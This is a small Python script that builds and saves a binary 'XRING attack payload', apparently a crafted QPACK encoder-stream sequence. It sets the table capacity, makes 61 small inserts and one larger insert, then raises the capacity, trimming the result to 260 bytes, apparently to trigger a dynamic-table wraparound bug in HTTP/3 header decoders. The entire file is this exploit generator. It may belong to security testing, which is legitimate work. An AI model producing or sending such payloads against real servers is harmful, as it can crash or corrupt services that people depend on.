#!/usr/bin/env python3
import sys
import os

output_path = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xring_payload.bin"
expected_size = int(sys.argv[2]) if len(sys.argv) > 2 else 260

# Generate XRING attack payload
payload = bytearray()

# Step 1: SET_DYNAMIC_TABLE_CAPACITY = 64 (2 bytes)
payload.extend([0x20, 0x40])

# Step 2: 61 INSERT operations (4 bytes each)
for _ in range(61):
    payload.extend([0x40, 1, ord('x'), 0])

# Step 3: One larger INSERT operation (13 bytes)
payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])

# Step 4: SET_DYNAMIC_TABLE_CAPACITY = 65 (2 bytes)
payload.extend([0x20, 0x41])

# Trim to exactly 260 bytes
payload = payload[:expected_size]

with open(output_path, 'wb') as f:
    f.write(payload)

actual_size = len(payload)
print(f"Payload generated: {actual_size} bytes")

if actual_size != expected_size:
    print(f"ERROR: Expected {expected_size} bytes, got {actual_size}")
    sys.exit(1)

sys.exit(0)
